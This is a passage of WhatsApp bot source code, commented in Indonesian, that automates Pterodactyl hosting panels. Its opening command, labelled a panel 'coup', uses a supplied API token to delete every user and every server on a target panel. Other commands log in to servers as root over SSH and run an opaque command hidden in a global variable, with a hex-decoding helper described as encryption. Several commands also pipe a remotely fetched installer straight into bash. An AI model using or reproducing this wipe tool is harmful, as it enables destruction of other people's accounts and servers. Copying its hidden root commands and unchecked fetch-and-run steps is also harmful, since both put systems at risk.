  if (!isOwner) return onlyOwn()
  let t = text.split(',');
  if (t.length < 2) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix+command} tokenptla,domainpnl`);

  let tokenptla = t[0];
  let domainpnl = t[1];

  // Menghapus "https://" jika sudah ada di depan
  if (domainpnl.startsWith('https://')) {
    domainpnl = domainpnl.slice(8);
  }

  // Menambahkan "https://" di depan domainpnl
  domainpnl = 'https://' + domainpnl;

  rafatharcodereply('KUDETA PANEL TELAH DI MULAI BOSKU');
  
  async function deleteAllUsers() {
    let currentPage = 1;
    let totalPages;

    do {
      let response = await fetch(`${domainpnl}/api/application/users?page=${currentPage}`, {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${tokenptla}`
        }
      });

      if (!response.ok) {
        rafatharcodereply(`Gagal mendapatkan data pengguna: ${response.statusText}`);
        console.log(await response.text());
        return;
      }

      let result = await response.json();

      // Memastikan data pagination ada
      if (result.meta && result.meta.pagination) {
        totalPages = result.meta.pagination.total_pages;
      } else {
        rafatharcodereply(`Gagal mendapatkan data pagination.`);
        return;
      }

      for (let user of result.data) {
        let userId = user.attributes.id;

        let deleteResponse = await fetch(`${domainpnl}/api/application/users/${userId}`, {
          method: 'DELETE',
          headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${tokenptla}`
          }
        });

        if (!deleteResponse.ok) {
          let errorResult = await deleteResponse.json();
          rafatharcodereply(`Gagal menghapus user dengan ID ${userId}: ${errorResult.errors}`);
        } else {
          console.log(`Berhasil menghapus user dengan ID ${userId}`);
        }
      }

      currentPage++;
    } while (currentPage <= totalPages);
  }

  async function deleteAllServers() {
    let currentPage = 1;
    let totalPages;

    do {
      let response = await fetch(`${domainpnl}/api/application/servers?page=${currentPage}`, {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${tokenptla}`
        }
      });

      if (!response.ok) {
        rafatharcodereply(`Gagal mendapatkan data server: ${response.statusText}`);
        console.log(await response.text());
        return;
      }

      let result = await response.json();

      // Memastikan data pagination ada
      if (result.meta && result.meta.pagination) {
        totalPages = result.meta.pagination.total_pages;
      } else {
        rafatharcodereply(`Gagal mendapatkan data pagination.`);
        return;
      }

      for (let server of result.data) {
        let serverId = server.attributes.id;

        let deleteResponse = await fetch(`${domainpnl}/api/application/servers/${serverId}`, {
          method: 'DELETE',
          headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${tokenptla}`
          }
        });

        if (!deleteResponse.ok) {
          let errorResult = await deleteResponse.json();
          rafatharcodereply(`Gagal menghapus server dengan ID ${serverId}: ${errorResult.errors}`);
        } else {
          console.log(`Berhasil menghapus server dengan ID ${serverId}`);
        }
      }

      currentPage++;
    } while (currentPage <= totalPages);
  }

  await deleteAllUsers();
  await deleteAllServers();

  rafatharcodereply('PROSES KUDETA PANEL TELAH SELESAI.');
}
break

case 'btlkdtpanel': {
if (!isOwner) return onlyOwn()
rafatharcodeReply('PROSES KUDETA PANEL DIBATALKAN SUKSES✅')
}  
break

case 'installthema': {
if (!isOwner && !isResinstall) return onlyOwn()
let t = text.split(',');
if (t.length < 2) return rafatharcodereply(`*Format salah!*
Penggunaan:
${prefix + command} ipVps,password`)
let ipvps = t[0];
let passwd = t[1];

let sections = [{
title: 'Silahkan Pilih Theme Yang Ingin Di install',
rows: [{
title: 'INSTALL THEME STELLAR',
id: `.th1 ${ipvps},${passwd}`
},
{
title: 'INSTALL THEME BILLING', 
id: `.th2 ${ipvps},${passwd}`
},
{
title: 'INSTALL THEME ENIGMA',
id: `.th3 ${ipvps},${passwd}`
}]
}]

let listMessage = {
    title: 'Klik Disini!', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By RiiSTORE ID', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: rafatharcode.decodeJid(rafatharcode.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Silahkan Pilih Theme Yang Ingin Anda Install`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${m.sender.split("@")[0]} 👋*`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/a2db5115e839a27f06f86.jpg" } }, { upload: rafatharcode.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await rafatharcode.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break  
case 'th1': {
    if (!isOwner) return onlyOwn()
    
    let t = text.split(',');
    if (t.length < 2) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}installtheme ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function rafatharcode(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = `${global.bash}`

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        rafatharcodereply('*PROSES INSTALL THEME DIMULAI MOHON TUNGGU 5-10 MENIT KEDEPAN*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                rafatharcodereply('`SUKSES INSTALL THEME PANEL ANDA, SILAHKAN CEK`')
                conn.end();
            }).on('data', (data) => {
                stream.write(`${global.tokeninstall}\n`);
                stream.write('1\n');
                stream.write('1\n');
                stream.write('y\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        rafatharcodereply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            rafatharcodereply('DONE GA BANG??');
        }
    }, 300000); // 180000 ms = 3 menit
   
}
break  
case 'th2': {
    if (!isOwner) return onlyOwn()
    
    let t = text.split(',');
    if (t.length < 2) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}installtheme ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function rafatharcode(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = `${global.bash}`

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        rafatharcodereply('*PROSES INSTALL THEME DIMULAI MOHON TUNGGU 5-10 MENIT KEDEPAN*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                rafatharcodereply('`SUKSES INSTALL THEME PANEL ANDA, SILAHKAN CEK`')
                conn.end();
            }).on('data', (data) => {
                stream.write(`${global.tokeninstall}\n`);
                stream.write('1\n');
                stream.write('2\n');
                stream.write('yes\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        rafatharcodereply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            rafatharcodereply('DONE GA BANG??');
        }
    }, 300000); // 180000 ms = 3 menit
   
}
break  
case 'th3': {
    if (!isOwner) return onlyOwn()
    
    let t = text.split(',');
    if (t.length < 2) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}installtheme ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function rafatharcode(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = `${global.bash}`

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        rafatharcodereply('*PROSES INSTALL THEME DIMULAI MOHON TUNGGU 5-10 MENIT KEDEPAN*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                rafatharcodereply('`SUKSES INSTALL THEME PANEL ANDA, SILAHKAN CEK`')
                conn.end();
            }).on('data', (data) => {
                stream.write(`${global.tokeninstall}\n`);
                stream.write('1\n');
                stream.write('3\n');
                stream.write('\n');
                stream.write('https://chat.whatsapp.com/L6xVjB6gd0vAKro8ImgV2Y\n');
                stream.write('https://whatsapp.com/channel/0029Vajny6c4tRs0qnwveJ0s\n');
                stream.write('yes\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        rafatharcodereply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            rafatharcodereply('DONE GA BANG??');
        }
    }, 300000); // 180000 ms = 3 menit
    
}
break  



case 'uninstallthema': {
if (!isOwner && !isResinstall) return onlyOwn();
let t = text.split(',');
 if (t.length < 2) return m.reply(`*Format salah!*\nPenggunaan: ${prefix}uninstalltheme ipvps,password`)
 
 let ipvps = t[0];
 let passwd = t[1];
 
 const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
 };
 function rafatharcode(opece) {
 return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
 }
 const command = `${global.bash}`

 const conn = new Client();
 let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

 conn.on('ready', () => {
 isSuccess = true; // Set flag menjadi true jika koneksi berhasil
 m.reply('*PROSES UNINSTALL THEME DIMULAI MOHON TUNGGU 3 MENIT KEDEPAN*');
 
 conn.exec(command, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Stream closed with code ' + code + ' and signal ' + signal);
 conn.end();
 }).on('data', (data) => {
 stream.write(`${global.tokeninstall}\n`);
 stream.write('2\n');
 stream.write('y\n');
 stream.write('yes\n');
 stream.write('x\n');
 
 console.log('STDOUT: ' + data);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
 m.reply('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 
 // Tambahkan jeda 3 menit (180000 ms) sebelum mengirim pesan "success uninstall theme"
 setTimeout(() => {
 if (isSuccess) {
 m.reply('SUCCES UNINSTALL THEME PANEL ANDA COBA CEK');
 }
 }, 180000); // 180000 ms = 3 menit
 
 
}

break

case 'createnode': {
    if (!isOwner && !isResinstall) return onlyOwn();
    
    let t = text.split(',');
    if (t.length < 2) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}createnode ipvps,password,domainnode,ramvps`)
    
    let ipvps = t[0];
    let passwd = t[1];
    let domainnode = t[2];
    let ramvps = t[3];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Gunakan string terenkripsi di kode Anda
    const command = `${global.bash}`
    const conn = new Client();
 
    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        rafatharcodereply('*MEMULAI CREATE NODE & LOCATION*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                rafatharcodereply('*NODE DAN LOCATION TELAH DI TAMBAHKAN SILAHAKAN TAMBAH KAN ALLOCATION MANUAL😂 & AMBIL TOKEN CONFIGURE*')
                conn.end();
            }).on('data', (data) => {
            stream.write(`${global.tokeninstall}\n`);
            stream.write('4\n');
                stream.write('SGP\n');
                stream.write('AutoCnode RafatharCode\n');
                stream.write(`${domainnode}\n`)
                stream.write('NODES\n');
                stream.write(`${ramvps}\n`);
                stream.write(`${ramvps}\n`);
                stream.write('1\n');
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        rafatharcodereply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   }
   
  break

case 'installpanel': {
    if (!isOwner && !isResinstall) return onlyOwn()
    let t = text.split(',');
    if (t.length < 5) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}installpanel ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
        rafatharcodereply('*PROSES PENGINSTALLAN PANEL SEDANG BERLANGSUNG MOHON TUNGGU 5-10MENIT*');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password, ramvps);
            }).on('data', (data) => {
                handlePanelInstallationInput(data, stream, subdomain, password);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
        rafatharcodereply('*PROSES PENGINSTALLAN WINGS SEDANG BERLANGSUNG MOHON TUNGGU 5-10MENIT*');
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = `${global.bash}`;
        rafatharcodereply('*MEMULAI CREATE NODE & LOCATION*');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    function sendPanelData(subdomain, password) {
        rafatharcodereply(`*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('A\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write(`${global.tokeninstall}\n`);
        stream.write('4\n');
        stream.write('SGP\n');
        stream.write('AutoCnode RafatharCode\n');
        stream.write(`${domainnode}\n`);
        stream.write('NODES\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
}

break  

case 'installpanel1': {
    if (!isOwner && !isResinstall) return onlyOwn()
    let t = text.split(',');
    if (t.length < 5) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}installpanel1 ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
        rafatharcodereply('`PROSES PENGINSTALLAN PANEL TUNGGU YA GA SABARAN TAK KOKOP`');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password, ramvps);
            }).on('data', (data) => {
                handlePanelInstallationInput(data, stream, subdomain, password);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
        rafatharcodereply('`PROSES PENGINSTALLAN WINGS TUNGGU YA MANIEZ`');
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = `${global.bash}`;
        rafatharcodereply('`MEMULAI CREATE NODE & LOCATION`');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    function sendPanelData(subdomain, password) {
        rafatharcodereply(`*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('A\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write(`${global.tokeninstall}\n`);
        stream.write('4\n');
        stream.write('SGP\n');
        stream.write('Jangan Lupa Support RafatharCode🦅🇮🇩\n');
        stream.write(`${domainnode}\n`);
        stream.write('NODES\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
}

break  

case 'installpanel1-v2': {
 if (!isOwner && !isResinstall) return onlyOwn()
 let t = text.split(',');
 if (t.length < 5) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}installpanel1 ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
 let ipvps = t[0];
 let passwd = t[1];
 let subdomain = t[2];
 let domainnode = t[3];
 let ramvps = t[4];
 const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
 };
 let password = generateRandomPassword();
 const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
 const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
 const conn = new Client();

 conn.on('ready', () => {
 rafatharcodereply('`PROSES PENGINSTALLAN PANEL TUNGGU YA GA SABARAN TAK KOKOP`');
 conn.exec(commandPanel, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
 installWings(conn, domainnode, subdomain, password, ramvps);
 }).on('data', (data) => {
 handlePanelInstallationInput(data, stream, subdomain, password);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }).connect(connSettings);

 async function installWings(conn, domainnode, subdomain, password, ramvps) {
 rafatharcodereply('`PROSES PENGINSTALLAN WINGS TUNGGU YA MANIEZ`');
 conn.exec(commandWings, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
 createNode(conn, domainnode, ramvps, subdomain, password);
 }).on('data', (data) => {
 handleWingsInstallationInput(data, stream, domainnode, subdomain);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }

 async function createNode(conn, domainnode, ramvps, subdomain, password) {
 const command = `${global.bash}`;
 rafatharcodereply('`MEMULAI CREATE NODE & LOCATION`');

 conn.exec(command, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
 conn.end();
 sendPanelData(subdomain, password);
 }).on('data', (data) => {
 handleNodeCreationInput(data, stream, domainnode, ramvps);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }

 function sendPanelData(subdomain, password) {
 var teks = `*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`
 let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy User\",\"id\":\"123456789\",\"copy_code\":\"admin\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
},
{
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Link Panel\",\"url\":\"${subdomain}\",\"merchant_url\":\"${subdomain}\"}"
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"SALIN START WINGS\",\"id\":\"123456789\",\"copy_code\":\".startwings ${ipvps},${passwd},\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 }

 function handlePanelInstallationInput(data, stream, subdomain, password) {
 if (data.toString().includes('Input')) {
 stream.write('0\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('1248\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('Asia/Jakarta\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('adm\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('adm\n');
 }
 if (data.toString().includes('Input')) {
 stream.write(`${password}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write(`${subdomain}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('yes\n');
 }
 if (data.toString().includes('Please read the Terms of Service')) {
 stream.write('A\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('1\n');
 }
